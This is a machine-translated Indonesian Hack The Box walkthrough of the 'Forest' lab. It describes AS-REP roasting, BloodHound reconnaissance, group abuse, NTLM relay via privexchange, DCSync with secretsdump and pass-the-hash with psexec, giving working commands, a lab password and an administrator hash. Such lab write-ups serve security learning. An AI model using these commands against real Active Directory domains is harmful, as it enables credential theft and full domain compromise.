<!doctype html>
<html class="no-js" lang="id">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>â˜¢ï¸ ğŸ”· ğŸ‘©ğŸ»â€ğŸ¤â€ğŸ‘¨ğŸ¾ Hack The Box - Walkthrough Forest. Serangan Roasting AS-REP, DCSync dan Pass-The-Hash â±ï¸ ğŸ‡ğŸ¿ ğŸ‘¨ğŸ¾â€ğŸ¤</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Saya terus menerbitkan solusi yang dikirim untuk diproses lebih lanjut dari situs HackTheBox . Saya berharap ini akan membantu setidaknya seseorang un...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Walkthrough Forest. Serangan Roasting AS-REP, DCSync dan Pass-The-Hash</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/493478/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/hb/tr/98/hbtr98btoexwyz38jz8ch0fjkkk.png" alt="gambar"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya terus menerbitkan solusi yang dikirim untuk </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">diproses lebih lanjut</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dari situs </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Saya berharap ini akan membantu setidaknya seseorang untuk berkembang di bidang keamanan informasi. </font><font style="vertical-align: inherit;">Pada artikel ini, kita akan berurusan dengan AS-REP Roasting dalam skema otentikasi Kerberos, gunakan BloodHound untuk pengintaian domain, melakukan serangan DCSync PrivExchange dan serangan Pass-The-Hash. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Koneksi ke laboratorium adalah melalui VPN. </font><font style="vertical-align: inherit;">Disarankan untuk tidak terhubung dari komputer kerja atau dari host di mana data penting bagi Anda tersedia, karena Anda berakhir di jaringan pribadi dengan orang-orang yang tahu sesuatu di bidang keamanan informasi :)</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informasi Organisasi</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mesin ini memiliki alamat IP 10.10.10.161, yang saya tambahkan ke / etc / hosts. </font></font><br>
<code>10.10.10.161 forest.htb</code><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertama, kami memindai port terbuka. </font><font style="vertical-align: inherit;">Karena butuh waktu lama untuk memindai semua port dengan nmap, saya akan melakukan ini dengan masscan. </font><font style="vertical-align: inherit;">Kami memindai semua port TCP dan UDP dari antarmuka tun0 dengan kecepatan 1000 paket per detik.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/z2/ay/2k/z2ay2kvslyrnctqo05rowzjjp34.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ada banyak port terbuka pada host, dan saya memutuskan untuk memastikan hasil yang diberikan oleh masscan benar. </font><font style="vertical-align: inherit;">Untuk melakukan ini, cukup pindai status port di nmap.</font></font><br>
<br>
<pre><code class="bash hljs">nmap 10.10.10.161 -p135,636,3269,49676,49665,53,593,49671,9389,49667,5985,49666,389,88,49684,464,3268,49677,47001,139,445,49714</code></pre><br>
<img src="https://habrastorage.org/webt/k6/kx/lp/k6kxlpjjub0ar5feglfjwqnw8ei.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tapi nmap mengkonfirmasi semuanya. </font><font style="vertical-align: inherit;">Selanjutnya, Anda perlu mengumpulkan lebih banyak informasi tentang port yang diketahui nmap.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A 10.10.10.161 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001</code></pre><br>
<img src="https://habrastorage.org/webt/dr/9d/eb/dr9debajqi1xhlflvnqexznf2ee.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Selanjutnya, Anda perlu mendapatkan informasi sebanyak mungkin dari sistem. </font><font style="vertical-align: inherit;">Untuk ini, saya menggunakan enum4linux. </font><font style="vertical-align: inherit;">Tetapi dia memberi kami sedikit informasi. </font><font style="vertical-align: inherit;">Grup, persyaratan kata sandi, kurangnya SMBv1 dan sumber daya bersama, dll. </font><font style="vertical-align: inherit;">Namun, kami mendapat daftar pengguna.</font></font><br>
<br>
<pre><code class="bash hljs">enum4linux -a 10.10.10.161</code></pre><br>
<img src="https://habrastorage.org/webt/ez/s-/a-/ezs-a-woghvvdj1ln_mbnukpfhm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Karena Kerberos berjalan pada host, Anda perlu memeriksa apakah ada akun pengguna yang memiliki flag DONT_REQ_PREAUTH yang diatur dalam UAC. Anda dapat mempelajari lebih lanjut tentang bendera UAC dan apa artinya di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Bendera DONT_REQ_PREAUTH berarti bahwa otentikasi Kerberos tidak diperlukan untuk akun ini. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertama, cari tahu akun pengguna mana yang aktif. Ini akan membantu membuat skrip samrdump disertakan dengan impacket.</font></font><br>
<br>
<pre><code class="bash hljs">impacket-samrdump forest.htb</code></pre><br>
<img src="https://habrastorage.org/webt/hi/e6/bz/hie6bzhv73inp0umhaetbakwb5s.png" alt="gambar"><br>
<br>
<img src="https://habrastorage.org/webt/dg/-n/gv/dg-ngvbdgi9ykyhoyncrko68t_i.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Script menampilkan pertama semua pengguna, dan kemudian informasi rinci tentang masing-masing dari mereka. </font><font style="vertical-align: inherit;">Dengan cara ini Anda dapat melihat bahwa akun Administrator aktif, dan Tamu tidak. </font><font style="vertical-align: inherit;">Sekarang kita dapat membuat daftar pengguna aktif. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/y5/n_/et/y5n_etusel7xf5ziwp1z3yczcxu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ketika kami memiliki daftar pengguna aktif, kami dapat memeriksa ketersediaan bendera yang kami butuhkan. </font><font style="vertical-align: inherit;">Kita dapat melakukan ini menggunakan skrip GetNPUsers, yang juga merupakan bagian dari paket impacket. </font><font style="vertical-align: inherit;">Kami menentukan domain htb.local, pengontrol domain 10.10.10.161, metode otentikasi Kerberos (-k), opsi tanpa kata sandi dan daftar pengguna.</font></font><br>
<br>
<pre><code class="bash hljs">GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -k -no-pass -usersfile ADUsers.txt </code></pre><br>
<img src="https://habrastorage.org/webt/hf/hs/ok/hfhsokebytkpia9rd58xen45ugi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami diberitahu bahwa bendera ini tidak disetel untuk semua pengguna kecuali svc-alfresco. </font><font style="vertical-align: inherit;">Dalam versi impacket saya (21-dev), hash diminta secara otomatis.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Entry Point - AS-REP Roasting</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Beberapa kata tentang hash dikembalikan kepada kami. </font><font style="vertical-align: inherit;">Di bawah ini adalah skema otentikasi Kerberos. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/vs/3a/ib/vs3aib6d1lag5b-mkuuxistyoic.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang Anda lihat, pada tahap pertama: klien mengirim pesan dengan ID pengguna ke server otentikasi AS dengan permintaan layanan atas nama pengguna. </font><font style="vertical-align: inherit;">AS menghasilkan kunci rahasia dengan hashing kata sandi pengguna yang ditemukan dalam database. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan cara ini kita dapat menggulir hash dan mencari tahu kata sandinya. </font><font style="vertical-align: inherit;">Jenis serangan ini disebut AS-REP Roasting. </font><font style="vertical-align: inherit;">Simpan hash ke file dan temukan prototipe.</font></font><br>
<br>
<pre><code class="bash hljs">john --wordlist=./rockyou.txt hashes2.txt</code></pre><br>
<img src="https://habrastorage.org/webt/ss/k6/9e/ssk69eytthsr6dfxtheeldntuhw.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami menemukan kata sandi pengguna.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PENGGUNA</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jika Anda kembali ke membuka port, Anda dapat menemukan layanan WinRM yang berfungsi (atau Windows Remote Management) yang dirancang untuk manajemen jarak jauh. </font><font style="vertical-align: inherit;">Kami memiliki nama pengguna dan kata sandi, sehingga kami dapat terhubung dengan aman ke sana. </font><font style="vertical-align: inherit;">Untuk ini saya menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">winrm jahat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jw/iw/kf/jwiwkfl75h-yukol4b7lr5jfpjo.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi kami mengambil pengguna.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AKAR</font></font></h2><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kecerdasan dengan BloodHound</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kita perlu meningkatkan hak istimewa kita. Untuk memetakan jalur LPE di domain, Anda bisa menggunakan program </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BloodHound</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Evil-winrm memungkinkan Anda untuk mengunggah file ke dan dari host. Saya mengunggah ke host SharpHound - modul untuk mengumpulkan informasi. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fe/95/ug/fe95ughqobbdwtby5zpxr6apltc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Juga win-win jahat memungkinkan Anda untuk mengeksekusi skrip PowerShell. Kami akan menunjukkan pengguna, kata sandi, dan juga bahwa kami ingin mengetahui segala sesuatu yang mungkin. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8c/ga/-g/8cga-gzy4a3ge7g-beygyg0voia.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah skrip dieksekusi, arsip zip akan muncul di direktori saat ini. Kami mengunduhnya dari host. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yz/rm/el/yzrmel0cg0xe7buwuli2olplo18.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Selanjutnya, jalankan grafik DBMS neo4j yang bekerja dengan BloodHound.</font></font><br>
<br>
<pre><code class="bash hljs">neo4j console</code></pre><br>
<img src="https://habrastorage.org/webt/wm/ke/pf/wmkepfwkg0l-bn6o3yniceir-pe.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang jalankan BloodHound. </font><font style="vertical-align: inherit;">Layar kosong akan menemui kami. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gl/kw/hx/glkwhxkprixwilsknm1drmtbbxi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang cukup seret dan lepas arsip yang diunduh ke dalamnya. </font><font style="vertical-align: inherit;">Dan pergi ke tab Queries. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2h/pl/qx/2hplqxwmjfksk31b5xdqactuz1a.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami mengatakan bahwa kami ingin menemukan jalur terpendek ke admin domain. </font><font style="vertical-align: inherit;">BloodHound akan membuat grafik - jalan menuju kemajuan yang konsisten. </font><font style="vertical-align: inherit;">Dengan mengklik pada setiap node jaringan, kami akan menerima informasi tentang itu. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/is/k1/j1/isk1j1t-kzohm6carowrfckpa3g.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian, kita diberitahu bahwa kita harus menjadi anggota grup Exchange Windows Izin, karena kita diperlakukan dengan Akun Layanan grup istimewa, dan hanya dengan demikian kita dapat meningkatkan hak istimewa.</font></font><br>
<br>
<pre><code class="bash hljs">net user svc-alfresco</code></pre><br>
<img src="https://habrastorage.org/webt/gd/s0/sy/gds0sybjncodwtlk0iw9vyagfbi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pengguna saat ini tidak ada dalam grup ini. </font><font style="vertical-align: inherit;">Mari kita tambahkan, dan kemudian periksa grup pengguna.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">Add-ADGroupMember</span> <span class="hljs-string">"Exchange Windows Permissions"</span> svc<span class="hljs-literal">-alfresco</span></code></pre><br>
<img src="https://habrastorage.org/webt/wo/nc/_1/wonc_1wjiqenlgiegyw3w6cbuhq.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pengguna berhasil ditambahkan ke grup. </font><font style="vertical-align: inherit;">Sekarang mari kita lihat apa yang ini memberi kita. </font><font style="vertical-align: inherit;">Grup Exchange Windows Izin memiliki hak WriteDACL (hak untuk memberikan hak) ke objek Domain di Active Directory, yang memungkinkan setiap anggota grup untuk mengubah hak domain, termasuk operasi DCSync.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DCSync</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sedikit tentang serangan DCSync. Replikasi Direktori Aktif adalah proses di mana perubahan yang dilakukan pada salah satu pengontrol domain disinkronkan dengan pengontrol lainnya dalam domain. Setelah memperoleh izin yang diperlukan, kami dapat memulai permintaan replikasi, yang akan memungkinkan kami untuk mendapatkan data yang disimpan di Active Directory, termasuk hash kata sandi. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Artinya, kita dapat menyinkronkan hash dari kata sandi pengguna Active Directory dan masuk ke layanan apa pun menggunakan protokol NTLM (Microsoft mengembangkan protokol otentikasi jaringan) atau Kerberos. Serangan itu melibatkan penggunaan dua alat, privexchange.py dan ntlmrelayx.py dari paket impacket. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertama, jalankan ntlmrelayx dalam mode relai LDAP ke pengontrol domain dengan akun svc-alfresco.</font></font><br>
<br>
<pre><code class="bash hljs">ntlmrelayx.py -t ldap://htb.local --escalate-user svc-alfresco</code></pre><br>
<img src="https://habrastorage.org/webt/ks/7h/cd/ks7hcdp2psno63lm-ffqrrdtdyg.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Semua layanan sedang berjalan dan sedang menunggu koneksi. </font><font style="vertical-align: inherit;">Sekarang gunakan privex.</font></font><br>
<br>
<pre><code class="bash hljs">python privexchange.py 10.10.10.161 -ah _ip -d htb.local -u svc-alfresco -p s3rvice</code></pre><br>
<img src="https://habrastorage.org/webt/wb/j1/yw/wbj1yw8rduzjd6yapfszi7f7g18.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kemudian saya menerbangkan banyak kesalahan, mencari-cari beberapa menit, diputuskan untuk tidak memperbaikinya. </font><font style="vertical-align: inherit;">Anda dapat mengikuti tautan di atas di peramban dan meneruskan otentikasi dengan kredensial svc-alfresco. </font><font style="vertical-align: inherit;">Di jendela dengan ntlmrelayx kita akan melihat informasi koneksi. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/d3/aj/hn/d3ajhnw1rgrfauebnrc5pxgvqqe.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang jalankan serangan DCSync menggunakan secretsdump.</font></font><br>
<br>
<pre><code class="bash hljs">secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc</code></pre><br>
<img src="https://habrastorage.org/webt/iy/ma/3c/iyma3ca8u7atdk_kav1cf0qroaq.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baik. </font><font style="vertical-align: inherit;">Kami dapat mereplikasi semua akun.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pass-the-hash attack</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Serangan ini memungkinkan penyerang untuk masuk ke server jauh yang diautentikasi menggunakan protokol NTLM atau LM. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada sistem yang menggunakan protokol otentikasi NTLM, kata sandi tidak pernah dikirimkan dalam teks yang jelas melalui saluran komunikasi. Sebagai gantinya, mereka ditransfer ke sistem yang sesuai (seperti pengontrol domain) dalam bentuk hash pada tahap respons dalam skema otentikasi pertanyaan-jawaban. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aplikasi Windows meminta pengguna untuk kata sandi dalam teks yang jelas, dan kemudian memanggil API (misalnya, LsaLogonUser), yang menerjemahkan kata sandi menjadi hash LM dan hash NTLM dan meneruskannya selama proses otentikasi. Analisis protokol menunjukkan bahwa untuk otentikasi yang berhasil tidak perlu mengetahui kata sandi dalam bentuk yang jelas, sebagai gantinya, hanya hash yang dapat digunakan.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Serangan itu didasarkan pada kelemahan dalam mengimplementasikan protokol otentikasi jaringan. </font><font style="vertical-align: inherit;">Terdiri dari fakta bahwa hash kata sandi ditransmisikan tanpa menggunakan garam, dan oleh karena itu tetap tidak berubah dari sesi ke sesi (hingga kata sandi pengguna diubah). </font><font style="vertical-align: inherit;">Dengan kata lain, untuk penyerang, hash kata sandi setara dengan kata sandi itu sendiri. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lakukan serangan menggunakan psexec.</font></font><br>
<br>
<pre><code class="bash hljs">psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161</code></pre><br>
<img src="https://habrastorage.org/webt/iz/wl/bf/izwlbfbysatzgxcnwmjxw1of6us.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami berada dalam sistem dengan hak penuh. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda dapat bergabung dengan kami di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Mari kita mengumpulkan komunitas di mana akan ada orang-orang yang berpengalaman dalam banyak bidang TI, maka kita selalu dapat saling membantu dalam masalah TI dan keamanan informasi.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id493452/index.html">Unity Background Image Blur</a></li>
<li><a href="../id493458/index.html">Bebaskan Android Anda - Alaverdi</a></li>
<li><a href="../id493462/index.html">Mandi ultrasonik. Bagian 2</a></li>
<li><a href="../id493468/index.html">Jangan takut bernafas dalam-dalam</a></li>
<li><a href="../id493470/index.html">Ilmuwan Menemukan Planet Kecil Baru Di Luar Neptunus</a></li>
<li><a href="../id493480/index.html">Arsitektur untuk pemula atau mengapa Anda tidak perlu memasukkan bendera ke pedang pria</a></li>
<li><a href="../id493482/index.html">Temui kura-kura cybernetic, pendahulu Roomba</a></li>
<li><a href="../id493484/index.html">C # Anda sudah "berfungsi", biarkan saja.</a></li>
<li><a href="../id493486/index.html">Startup otomotif paling menarik 2019-2020</a></li>
<li><a href="../id493488/index.html">Unity + git = friendship: part 1 set gentleman</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>